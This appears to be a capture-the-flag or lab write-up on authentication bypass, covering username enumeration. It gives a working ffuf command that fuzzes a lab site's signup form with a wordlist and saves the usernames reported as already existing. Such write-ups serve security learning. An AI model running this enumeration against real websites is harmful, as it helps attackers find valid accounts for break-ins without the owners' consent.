# 🔓 Authentication Bypass

## 📝 Introduction

In this room, **Authentication Bypass**, we aim to understand how to identify and exploit vulnerabilities that allow attackers to bypass authentication mechanisms. These vulnerabilities can lead to unauthorised access, data leaks, and full system compromise. 
Understanding these techniques is crucial for both offensive security testing and defensive hardening.

## ⚙️ Process

### 1. **Username Enumeration**
will try to create a valid usernames list for the targeted website through the sign-up page, to find all usernames logged into it previously.
To conduct this attack, we will use ffuf, which is a enumeration tool that can be downloaded from https://github.com/ffuf/ffuf.
Create a text file that stores the outputs.

from my terminal:

ffuf -w /home/kali/names.txt \
     -u http://10.10.x.x/customers/signup \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mr "username already exists" \
    	-o - | grep "username=" | awk -F'=' '{print $2}' > usernames_only.txt

Note: correct order for the flags is =>  
				
					-w -> -u -> -X -> -d -> other flags

-w word list

-u target

-X post HTTP method

-d data

-H Header

-mr match response

-o output file



<img width="1072" height="620" alt="ffuf" src="https://github.com/user-attachments/assets/71de6c3d-75d8-4f0d-b441-0b9fbf7a0a0d" />




